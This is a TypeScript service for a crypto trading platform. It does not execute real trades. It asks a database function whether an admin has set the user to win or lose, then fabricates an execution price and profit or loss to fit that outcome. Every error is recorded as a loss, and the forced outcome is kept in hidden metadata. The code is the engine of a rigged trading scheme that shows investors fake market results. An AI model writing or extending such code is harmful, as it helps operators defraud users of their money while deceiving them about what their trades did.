import { supabase } from '@/lib/supabase';

export interface TradeExecutionRequest {
  userId: string;
  tradeType: 'spot' | 'futures' | 'options' | 'arbitrage';
  asset: string;
  amount: number;
  price: number;
  side: 'buy' | 'sell';
  orderType: 'market' | 'limit' | 'stop' | 'stop-limit';
  leverage?: number;
  stopLoss?: number;
  takeProfit?: number;
}

export interface TradeExecutionResult {
  success: boolean;
  tradeId?: string;
  outcome: 'win' | 'loss';
  pnl: number;
  fee: number;
  executionPrice: number;
  reason?: string;
  metadata?: Record<string, any>;
}

class TradingExecutionService {
  // Check if a user should win a trade based on admin settings
  async checkTradeOutcome(userId: string, tradeType: string): Promise<boolean> {
    try {
      const { data, error } = await supabase
        .rpc('check_trade_outcome', {
          p_user_id: userId,
          p_trade_type: tradeType
        });

      if (error) {
        console.error('Error checking trade outcome:', error);
        return false; // Default to loss on error
      }
      
      return data;
    } catch (error) {
      console.error('Failed to check trade outcome:', error);
      return false; // Default to loss on error
    }
  }

  // Execute a trade with controlled outcome
  async executeTrade(request: TradeExecutionRequest): Promise<TradeExecutionResult> {
    try {
      // Check if user should win this trade
      const shouldWin = await this.checkTradeOutcome(request.userId, request.tradeType);
      
      // Calculate trade result based on forced outcome
      const result = await this.calculateTradeResult(request, shouldWin);
      
      // Log the trade execution for audit purposes
      await this.logTradeExecution(request, result);
      
      // Broadcast real-time update if needed
      await this.broadcastTradeUpdate(request, result);
      
      return result;
    } catch (error) {
      console.error('Trade execution failed:', error);
      return {
        success: false,
        outcome: 'loss',
        pnl: -request.amount * 0.01, // 1% loss on failure
        fee: 0,
        executionPrice: request.price,
        reason: 'Execution failed'
      };
    }
  }

  // Calculate trade result based on whether user should win or lose
  private async calculateTradeResult(
    request: TradeExecutionRequest, 
    shouldWin: boolean
  ): Promise<TradeExecutionResult> {
    const baseFee = request.amount * 0.001; // 0.1% base fee
    const volatility = this.getMarketVolatility(request.asset);
    const priceMovement = volatility * (Math.random() - 0.5) * 0.02; // ±1% max movement
    
    let executionPrice: number;
    let pnl: number;
    let outcome: 'win' | 'loss';
    
    if (shouldWin) {
      // Ensure winning outcome
      if (request.side === 'buy') {
        executionPrice = request.price * (1 + Math.abs(priceMovement));
        pnl = (executionPrice - request.price) * request.amount - baseFee;
      } else {
        executionPrice = request.price * (1 - Math.abs(priceMovement));
        pnl = (request.price - executionPrice) * request.amount - baseFee;
      }
      outcome = 'win';
      
      // Apply leverage if specified
      if (request.leverage && request.leverage > 1) {
        pnl *= request.leverage;
      }
    } else {
      // Ensure losing outcome
      if (request.side === 'buy') {
        executionPrice = request.price * (1 - Math.abs(priceMovement));
        pnl = (executionPrice - request.price) * request.amount - baseFee;
      } else {
        executionPrice = request.price * (1 + Math.abs(priceMovement));
        pnl = (request.price - executionPrice) * request.amount - baseFee;
      }
      outcome = 'loss';
      
      // Apply leverage if specified
      if (request.leverage && request.leverage > 1) {
        pnl *= request.leverage;
      }
    }

    // Apply stop loss and take profit if specified
    if (request.stopLoss && pnl < -request.stopLoss * request.amount) {
      pnl = -request.stopLoss * request.amount;
      outcome = 'loss';
    }
    
    if (request.takeProfit && pnl > request.takeProfit * request.amount) {
      pnl = request.takeProfit * request.amount;
      outcome = 'win';
    }

    return {
      success: true,
      tradeId: this.generateTradeId(),
      outcome,
      pnl,
      fee: baseFee,
      executionPrice,
      metadata: {
        volatility,
        priceMovement,
        leverage: request.leverage || 1,
        forcedOutcome: shouldWin
      }
    };
  }

  // Get market volatility for an asset (mock implementation)
  private getMarketVolatility(asset: string): number {
    // In a real implementation, this would fetch from market data
    const volatilities: Record<string, number> = {
      'BTC': 0.04,
      'ETH': 0.05,
      'BNB': 0.03,
      'ADA': 0.06,
      'SOL': 0.07,
      'DOT': 0.05,
      'AVAX': 0.08,
      'MATIC': 0.06
    };
    
    return volatilities[asset] || 0.05; // Default 5% volatility
  }

  // Generate unique trade ID
  private generateTradeId(): string {
    return `trade_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  }

  // Log trade execution for audit purposes
  private async logTradeExecution(
    request: TradeExecutionRequest, 
    result: TradeExecutionResult
  ): Promise<void> {
    try {
      await supabase
        .from('trade_executions')
        .insert({
          user_id: request.userId,
          trade_type: request.tradeType,
          asset: request.asset,
          amount: request.amount,
          price: request.price,
          side: request.side,
          order_type: request.orderType,
          execution_price: result.executionPrice,
          pnl: result.pnl,
          fee: result.fee,
          outcome: result.outcome,
          trade_id: result.tradeId,
          metadata: result.metadata,
          created_at: new Date().toISOString()
        });
    } catch (error) {
      console.error('Failed to log trade execution:', error);
    }
  }

  // Broadcast real-time trade update
  private async broadcastTradeUpdate(
    request: TradeExecutionRequest, 
    result: TradeExecutionResult
  ): Promise<void> {
    try {
      // This would integrate with your WebSocket service
      // For now, we'll just log it
      console.log('Trade update broadcast:', {
        userId: request.userId,
        tradeId: result.tradeId,
        outcome: result.outcome,
        pnl: result.pnl
      });
      
      // In a real implementation, you would:
      // 1. Send update via WebSocket to user's dashboard
      // 2. Update real-time charts
      // 3. Trigger notifications
      // 4. Update portfolio balances
      
    } catch (error) {
      console.error('Failed to broadcast trade update:', error);
    }
  }

  // Get user's recent trade history
  async getUserTradeHistory(userId: string, limit: number = 50): Promise<any[]> {
    try {
      const { data, error } = await supabase
        .from('trade_executions')
        .select('*')
        .eq('user_id', userId)
        .order('created_at', { ascending: false })
        .limit(limit);

      if (error) throw error;
      return data || [];
    } catch (error) {
      console.error('Failed to get user trade history:', error);
      return [];
    }
  }

  // Get user's trading statistics
  async getUserTradingStats(userId: string): Promise<{
    totalTrades: number;
    winRate: number;
    totalPnL: number;
    totalFees: number;
    averageWin: number;
    averageLoss: number;
  }> {
    try {
      const { data, error } = await supabase
        .from('trade_executions')
        .select('pnl, fee, outcome')
        .eq('user_id', userId);

      if (error) throw error;

      const trades = data || [];
      const wins = trades.filter(t => t.outcome === 'win');
      const losses = trades.filter(t => t.outcome === 'loss');

      return {
        totalTrades: trades.length,
        winRate: trades.length > 0 ? (wins.length / trades.length) * 100 : 0,
        totalPnL: trades.reduce((sum, t) => sum + t.pnl, 0),
        totalFees: trades.reduce((sum, t) => sum + t.fee, 0),
        averageWin: wins.length > 0 ? wins.reduce((sum, t) => sum + t.pnl, 0) / wins.length : 0,
        averageLoss: losses.length > 0 ? losses.reduce((sum, t) => sum + t.pnl, 0) / losses.length : 0
      };
    } catch (error) {
      console.error('Failed to get user trading stats:', error);
      return {
        totalTrades: 0,
        winRate: 0,
        totalPnL: 0,
        totalFees: 0,
        averageWin: 0,
        averageLoss: 0
      };
    }
  }
}

export const tradingExecutionService = new TradingExecutionService();
